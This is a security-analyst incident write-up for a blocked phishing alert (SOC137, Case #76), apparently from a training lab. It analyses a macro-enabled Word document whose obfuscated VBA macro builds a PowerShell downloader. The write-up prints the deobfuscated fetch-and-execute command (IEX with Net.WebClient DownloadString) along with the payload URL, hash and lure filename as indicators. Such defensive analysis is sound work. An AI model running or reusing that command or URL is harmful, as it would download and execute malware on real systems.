# SOC137 - Malicious File/Script Download Attempt — Case #76

## Alert Overview
- Severity: High
- Detection Source: Web/Email Security Gateway
- Asset Affected: NicolasPRD (172.16.17.37)
- Threat Type: Malicious Document (MalDoc) / PowerShell Downloader
- Status: True Positive (Blocked)

## Strategy and Technical Context
The strategy observed in this incident is a classic phishing delivery mechanism utilizing a malicious macro-enabled Word document (`.docm`). To bypass signature-based perimeter defenses, the threat actor relies on heavily obfuscated strings to dynamically build and execute a PowerShell command in memory. The technical objective of the macro is to act merely as a first-stage "stager" that reaches out to a legitimate, public file-sharing service (`filetransfer.io`) to download the actual second-stage malware payload.

## Brief about the Concept
Visual Basic for Applications (VBA) macros are frequently abused to achieve code execution on a victim's machine. By utilizing the `AutoOpen()` function, the macro executes automatically as soon as the user opens the document and clicks "Enable Content." In this case, the macro invokes `powershell.exe` and uses the `Invoke-Expression (IEX)` cmdlet to run a command built from fragmented string segments (e.g., `'N'+'e'+'t'+'.'+'Webc'+'lient'`). This string concatenation prevents static antivirus engines from easily reading the malicious script.

## Investigation Steps

1. **Alert Triage:** Initiated investigation on Event ID 76 regarding an attempted download of a `.docm` file named `INVOICE PACKAGE LINK TO DOWNLOAD.docm` by the host `NicolasPRD`. The perimeter appliance successfully intercepted and blocked the download.
2. **Threat Intelligence Enrichment:** Extracted the MD5 hash (`f2d0c66b801244c059f636d08a474079`) and queried it against VirusTotal and Any.Run. The file was flagged by 40/63 security vendors, confirming high malicious confidence.
3. **Static Malware Analysis:** To understand the document's capabilities without detonating it, the file was analyzed in an isolated environment using the `olevba` tool from the `oletools` Python suite. 
4. **Payload Deobfuscation:** `olevba` successfully extracted the VBA macro containing the `AutoOpen()` subroutine. The macro contained an obfuscated `Shell` execution command. By manually deobfuscating the concatenated strings, the true command was revealed:
   `powershell IEX ((new-Object (Net.WebClient)).DownloadString('https://filetransfer.io/data-package/UR2whuBv/download'))`
5. **Endpoint and Network Correlation:** Pivoted to the SIEM and EDR platforms to verify the host `NicolasPRD`. Log review confirmed no execution of the file took place and no outbound network connections were made to `filetransfer.io` or its associated IPs.

## Analysis & Findings
The incident is a confirmed True Positive. The file is a malicious downloader. The attacker utilized string concatenation obfuscation to hide a PowerShell command designed to download a secondary payload from a public file-sharing repository. However, because the initial download of the `.docm` file was halted by the security gateway (Device Action: Blocked), the attack chain was broken before it could reach the endpoint. The host `NicolasPRD` is safe, and no compromise occurred. 

## MITRE ATT&CK Mapping
| Tactic | Technique ID | Technique Name |
| :--- | :--- | :--- |
| **Initial Access** | T1566.001 | Phishing: Spearphishing Attachment |
| **Execution** | T1059.005 | Command and Scripting Interpreter: Visual Basic |
| **Execution** | T1059.001 | Command and Scripting Interpreter: PowerShell |
| **Defense Evasion** | T1027 | Obfuscated Files or Information |
| **Command and Control** | T1105 | Ingress Tool Transfer |

## Indicators of Compromise

| Type | Value | Context |
|------|------|--------|
| Hash (MD5) | `f2d0c66b801244c059f636d08a474079` | Malicious `.docm` first-stage downloader |
| URL | `https://filetransfer.io/data-package/UR2whuBv/download` | Secondary payload hosting URL |
| File Name | `INVOICE PACKAGE LINK TO DOWNLOAD.docm` | Lure filename |

## Blind Spots
Because the initial payload was successfully blocked at the perimeter, the secondary payload hosted on `filetransfer.io` was not retrieved or analyzed. Without downloading and sandboxing that secondary file, the ultimate goal of the threat actor (e.g., Ransomware deployment, InfoStealer, or RAT) remains unknown. 

## False Positives
Legitimate users frequently use services like `filetransfer.io` or `WeTransfer` to share large invoice packages or business documents. However, an Office document using hidden PowerShell to interact with these services without user interaction is exclusively malicious behavior.

## Mistakes and Lessons Learned
**Analyst Reflection:** During the initial phase of the investigation, I prepared to isolate the host `NicolasPRD`. 
**The Lesson:** It is critical to verify the "Device Action" field immediately during triage. Noting that the action was "Blocked" shifted the focus of the investigation from "Incident Containment" to "Threat Intelligence Gathering." Recognizing blocked actions early saves critical response time and prevents unnecessary disruption to the end user.

## Response & Closure
- Action Taken: Extracted the payload URL and hash from the blocked document. Added the IOCs to the organizational blocklist to prevent future delivery attempts via alternative vectors.
- Containment Required: No. The attack was successfully blocked at the perimeter.
- Closure Reason: True Positive. Malicious document download attempt thwarted by security controls.

## Recommendations
1. **Macro Security Policies:** Enforce Group Policy Objects (GPO) to completely disable the execution of VBA macros for documents originating from the internet (enforcing Mark-of-the-Web).
2. **Cloud Storage Filtering:** Threat actors are heavily abusing free file-sharing services (Living off the Cloud). If `filetransfer.io` has no legitimate business use case within the organization, it should be blocked at the web proxy.
3. **PowerShell Hardening:** Implement Constrained Language Mode (CLM) to prevent non-administrative users from executing advanced `Net.WebClient` download strings.

## Evidence
<img width="700" height="181" alt="image" src="https://github.com/user-attachments/assets/cb9b9f72-851d-4492-91d7-af3dba79285a" />
<img width="700" height="642" alt="image" src="https://github.com/user-attachments/assets/e650fcb7-3fda-4652-8589-0bc269b6b92f" />

## Skills & Tools Used
Static Malware Analysis, `olevba` (oletools), De-obfuscation (String Concatenation Reassembly), Threat Intelligence (VirusTotal, Any.Run), SIEM Log Correlation.
